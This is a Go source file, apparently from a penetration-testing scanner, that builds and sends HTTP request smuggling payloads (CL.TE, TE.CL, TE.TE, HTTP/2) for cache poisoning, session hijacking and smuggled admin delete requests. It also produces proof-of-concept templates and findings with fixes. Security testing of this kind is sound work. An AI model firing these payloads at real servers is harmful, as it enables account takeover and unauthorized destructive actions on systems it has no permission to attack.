package smuggling

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/CodeMonkeyCybersecurity/shells/pkg/types"
	"github.com/google/uuid"
)

// Exploiter handles smuggling exploitation logic
type Exploiter struct {
	detector *Detector
	config   *SmugglingConfig
}

// NewExploiter creates a new smuggling exploiter
func NewExploiter(client *http.Client, config *SmugglingConfig) *Exploiter {
	return &Exploiter{
		detector: NewDetector(client, config),
		config:   config,
	}
}

// ExploitationResult represents the result of an exploitation attempt
type ExploitationResult struct {
	Success     bool                   `json:"success"`
	Technique   string                 `json:"technique"`
	Target      string                 `json:"target"`
	Payload     string                 `json:"payload"`
	Impact      string                 `json:"impact"`
	Evidence    []Evidence             `json:"evidence"`
	Metadata    map[string]interface{} `json:"metadata"`
	CreatedAt   time.Time              `json:"created_at"`
}

// ExploitCLTE attempts to exploit CL.TE smuggling
func (e *Exploiter) ExploitCLTE(ctx context.Context, target string) (*ExploitationResult, error) {
	result := &ExploitationResult{
		Technique: TechniqueCLTE,
		Target:    target,
		CreatedAt: time.Now(),
	}

	// Use cache poisoning payload
	poisonPayload := SmugglingPayload{
		Name:        "CL.TE Cache Poisoning",
		Description: "Attempts to poison cache using CL.TE desync",
		Technique:   TechniqueCLTE,
		Request1: fmt.Sprintf(`POST / HTTP/1.1
Host: %s
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: %s
X-Ignore: X`, e.extractHost(target), e.extractHost(target)),
		Expected: "Cache poisoning via smuggled request",
		Impact:   "Cache poisoning allowing unauthorized access",
		Severity: "HIGH",
	}

	// Test the payload
	smugglingResult := e.detector.TestCLTE(ctx, target, poisonPayload)
	
	result.Success = smugglingResult.Vulnerable
	result.Payload = poisonPayload.Request1
	result.Impact = poisonPayload.Impact
	result.Evidence = smugglingResult.Evidence
	result.Metadata = map[string]interface{}{
		"confidence": smugglingResult.Confidence,
		"duration":   smugglingResult.Duration.String(),
		"technique":  poisonPayload.Technique,
	}

	return result, nil
}

// ExploitTECL attempts to exploit TE.CL smuggling
func (e *Exploiter) ExploitTECL(ctx context.Context, target string) (*ExploitationResult, error) {
	result := &ExploitationResult{
		Technique: TechniqueTECL,
		Target:    target,
		CreatedAt: time.Now(),
	}

	// Use session hijacking payload
	hijackPayload := SmugglingPayload{
		Name:        "TE.CL Session Hijacking",
		Description: "Attempts session hijacking using TE.CL desync",
		Technique:   TechniqueTECL,
		Request1: fmt.Sprintf(`POST / HTTP/1.1
Host: %s
Content-Length: 4
Transfer-Encoding: chunked

1a
POST /login HTTP/1.1
Host: %s
Content-Length: 100

username=admin&password=stolen
0

`, e.extractHost(target), e.extractHost(target)),
		Expected: "Session hijacking via smuggled login request",
		Impact:   "Session hijacking allowing account takeover",
		Severity: "CRITICAL",
	}

	// Test the payload
	smugglingResult := e.detector.TestTECL(ctx, target, hijackPayload)
	
	result.Success = smugglingResult.Vulnerable
	result.Payload = hijackPayload.Request1
	result.Impact = hijackPayload.Impact
	result.Evidence = smugglingResult.Evidence
	result.Metadata = map[string]interface{}{
		"confidence": smugglingResult.Confidence,
		"duration":   smugglingResult.Duration.String(),
		"technique":  hijackPayload.Technique,
	}

	return result, nil
}

// ExploitTETE attempts to exploit TE.TE smuggling
func (e *Exploiter) ExploitTETE(ctx context.Context, target string) (*ExploitationResult, error) {
	result := &ExploitationResult{
		Technique: TechniqueTETE,
		Target:    target,
		CreatedAt: time.Now(),
	}

	// Use header obfuscation payload
	obfuscationPayload := SmugglingPayload{
		Name:        "TE.TE Header Obfuscation",
		Description: "Attempts exploitation using header obfuscation",
		Technique:   TechniqueTETE,
		Request1: fmt.Sprintf(`POST / HTTP/1.1
Host: %s
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

1f
POST /api/admin HTTP/1.1
Host: %s
Content-Length: 20

action=delete&id=1
0

`, e.extractHost(target), e.extractHost(target)),
		Expected: "Administrative action via obfuscated headers",
		Impact:   "Unauthorized administrative access",
		Severity: "HIGH",
	}

	// Test the payload
	smugglingResult := e.detector.TestTETE(ctx, target, obfuscationPayload)
	
	result.Success = smugglingResult.Vulnerable
	result.Payload = obfuscationPayload.Request1
	result.Impact = obfuscationPayload.Impact
	result.Evidence = smugglingResult.Evidence
	result.Metadata = map[string]interface{}{
		"confidence": smugglingResult.Confidence,
		"duration":   smugglingResult.Duration.String(),
		"technique":  obfuscationPayload.Technique,
	}

	return result, nil
}

// GenerateExploitFindings generates findings for exploitation attempts
func (e *Exploiter) GenerateExploitFindings(results []*ExploitationResult) []types.Finding {
	findings := []types.Finding{}

	for _, result := range results {
		if result.Success {
			finding := types.Finding{
				ID:          uuid.New().String(),
				Tool:        "smuggling",
				Type:        e.getVulnTypeFromTechnique(result.Technique),
				Severity:    types.SeverityHigh,
				Title:       fmt.Sprintf("HTTP Request Smuggling Exploitation - %s", result.Technique),
				Description: fmt.Sprintf("Successfully exploited %s request smuggling vulnerability", result.Technique),
				Evidence:    e.buildExploitEvidence(result),
				Solution:    e.buildExploitSolution(result.Technique),
				References:  e.buildExploitReferences(result.Technique),
				Metadata: map[string]interface{}{
					"technique":     result.Technique,
					"target":        result.Target,
					"impact":        result.Impact,
					"exploitation":  true,
					"payload_used":  result.Payload,
					"evidence":      result.Evidence,
					"metadata":      result.Metadata,
				},
				CreatedAt: result.CreatedAt,
			}
			findings = append(findings, finding)
		}
	}

	return findings
}

// buildExploitEvidence builds evidence string for exploitation
func (e *Exploiter) buildExploitEvidence(result *ExploitationResult) string {
	evidence := strings.Builder{}
	evidence.WriteString(fmt.Sprintf("Technique: %s\n", result.Technique))
	evidence.WriteString(fmt.Sprintf("Target: %s\n", result.Target))
	evidence.WriteString(fmt.Sprintf("Impact: %s\n", result.Impact))
	evidence.WriteString(fmt.Sprintf("Exploitation: %v\n", result.Success))
	
	if len(result.Evidence) > 0 {
		evidence.WriteString("\nEvidence:\n")
		for _, ev := range result.Evidence {
			evidence.WriteString(fmt.Sprintf("- %s: %s\n", ev.Type, ev.Description))
		}
	}
	
	evidence.WriteString("\nPayload:\n")
	evidence.WriteString(result.Payload)
	
	return evidence.String()
}

// buildExploitSolution builds solution for exploitation
func (e *Exploiter) buildExploitSolution(technique string) string {
	solutions := map[string]string{
		TechniqueCLTE: "CRITICAL: Fix CL.TE desync immediately. Normalize Content-Length and Transfer-Encoding handling between frontend and backend. Implement strict header validation.",
		TechniqueTECL: "CRITICAL: Fix TE.CL desync immediately. Ensure consistent Transfer-Encoding processing. Reject requests with conflicting headers.",
		TechniqueTETE: "CRITICAL: Fix TE.TE desync immediately. Implement strict Transfer-Encoding header validation. Reject duplicate or malformed headers.",
	}

	if solution, exists := solutions[technique]; exists {
		return solution
	}

	return "CRITICAL: Fix request smuggling vulnerability immediately. Implement proper HTTP request parsing and validation."
}

// buildExploitReferences builds references for exploitation
func (e *Exploiter) buildExploitReferences(technique string) []string {
	return []string{
		"https://portswigger.net/web-security/request-smuggling",
		"https://portswigger.net/web-security/request-smuggling/exploiting",
		"https://owasp.org/www-community/attacks/HTTP_Request_Smuggling",
		"https://tools.ietf.org/html/rfc7230#section-3.3.3",
	}
}

// getVulnTypeFromTechnique gets vulnerability type from technique
func (e *Exploiter) getVulnTypeFromTechnique(technique string) string {
	typeMap := map[string]string{
		TechniqueCLTE: VulnSmugglingCLTE,
		TechniqueTECL: VulnSmugglingTECL,
		TechniqueTETE: VulnSmugglingTETE,
		TechniqueHTTP2: VulnSmugglingHTTP2,
	}

	if vulnType, exists := typeMap[technique]; exists {
		return vulnType
	}

	return "HTTP_REQUEST_SMUGGLING"
}

// extractHost extracts the host from a target URL
func (e *Exploiter) extractHost(target string) string {
	if strings.HasPrefix(target, "http://") {
		return strings.TrimPrefix(target, "http://")
	}
	if strings.HasPrefix(target, "https://") {
		return strings.TrimPrefix(target, "https://")
	}
	return target
}

// GeneratePoC generates proof of concept for a smuggling vulnerability
func (e *Exploiter) GeneratePoC(technique, target string) string {
	host := e.extractHost(target)
	
	pocs := map[string]string{
		TechniqueCLTE: fmt.Sprintf(`# CL.TE Request Smuggling PoC
# Target: %s

# Step 1: Send the smuggling request
POST / HTTP/1.1
Host: %s
Content-Length: 6
Transfer-Encoding: chunked

0

G

# Step 2: Send a normal request
POST / HTTP/1.1
Host: %s
Content-Length: 0

# The 'G' from the first request should interfere with the second request
`, target, host, host),

		TechniqueTECL: fmt.Sprintf(`# TE.CL Request Smuggling PoC
# Target: %s

# Send the smuggling request
POST / HTTP/1.1
Host: %s
Content-Length: 4
Transfer-Encoding: chunked

12
GPOST / HTTP/1.1
Host: %s
0

# The frontend processes as chunked, backend processes with Content-Length
`, target, host, host),

		TechniqueTETE: fmt.Sprintf(`# TE.TE Request Smuggling PoC
# Target: %s

# Send the smuggling request with duplicate Transfer-Encoding headers
POST / HTTP/1.1
Host: %s
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5e
GPOST / HTTP/1.1
Host: %s
Content-Length: 15

x=1
0

# Different servers handle duplicate Transfer-Encoding headers differently
`, target, host, host),

		TechniqueHTTP2: fmt.Sprintf(`# HTTP/2 Request Smuggling PoC
# Target: %s

# Send HTTP/2 request that downgrades to HTTP/1.1
POST / HTTP/2
Host: %s
Content-Length: 0

GET /admin HTTP/1.1
Host: %s
Content-Length: 10

x=1

# HTTP/2 frontend downgrades to HTTP/1.1 backend
`, target, host, host),
	}

	if poc, exists := pocs[technique]; exists {
		return poc
	}

	return fmt.Sprintf("# Request Smuggling PoC for %s\n# Target: %s\n# Technique: %s\n", technique, target, technique)
}